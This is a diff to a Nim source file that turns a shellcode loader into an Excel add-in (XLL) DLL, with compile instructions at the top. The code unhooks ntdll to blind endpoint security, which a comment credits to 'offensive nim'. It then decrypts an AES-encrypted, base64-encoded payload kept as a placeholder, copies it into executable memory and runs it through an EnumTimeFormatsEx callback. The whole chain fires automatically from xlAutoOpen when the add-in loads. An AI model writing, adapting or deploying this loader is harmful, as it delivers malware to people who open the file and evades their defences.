@@ -1,3 +1,10 @@
+#[
+    Compile:
+        nim c -d=mingw --app=lib --nomain --cpu=amd64 nim_xll.nim
+        
+    Will compile as a DLL, you can then just change the extension to .xll
+]#
+
 import nimcrypto
 import base64
 import winim
@@ -14,8 +21,9 @@ func toByteSeq(str: string): seq[byte] {.inline.} =
     # Converts a string to the corresponding byte sequence
     @(str.toOpenArrayByte(0, str.high))
 
+
 #credit to offensive nim while i figure out a diff way to do this
-proc ntdllunhook*(): bool =
+proc ntdllunhook(): bool =
   let low: uint16 = 0
   var 
       processH = GetCurrentProcess()
@@ -62,28 +70,27 @@ proc ntdllunhook*(): bool =
 
 proc shellcodeCallback(shellcode: openarray[byte]): void =
 
-
-    # Allocate memory
     let rPtr = VirtualAlloc(
-        nil,
+        NULL,
         cast[SIZE_T](shellcode.len),
         MEM_COMMIT,
         PAGE_EXECUTE_READ_WRITE
-    )    
-    
+    )
     # Copy Shellcode to the allocated memory section
-    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))    
+    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 
+
+
     
-    # Callback execution
-    EnumSystemGeoID(
-        16,
-        0,
-        cast[GEO_ENUMPROC](rPtr)
-    ) 
+    EnumTimeFormatsEx(
+        cast [TIMEFMT_ENUMPROCEX](rPtr),
+        LOCALE_NAME_SYSTEM_DEFAULT,
+        TIME_NOSECONDS,
+        cast[LPARAM](nil)
+    )
 
 
-
-when isMainModule:
+proc xlAutoOpen() {.stdcall, exportc, dynlib.} =
+   when isMainModule:
         let shellcode_base64_encrypted = "REPLACE_ME" #the easy way! replace me back if you need to remake your payload
         var result = ntdllunhook()  #so we need to assign it to a variable even though its not used. But if you discard it, it won't work... O_o
         var encodedIV: string = "t47unCor+GR9+cD+2d6FlQ==" #base64 encoded IV. hardcoded...fix this later
@@ -110,3 +117,10 @@ when isMainModule:
         
         #fire!
         shellcodeCallback(dectext)
+
+proc NimMain() {.cdecl, importc.}
+
+proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+  NimMain()
+
+  return true
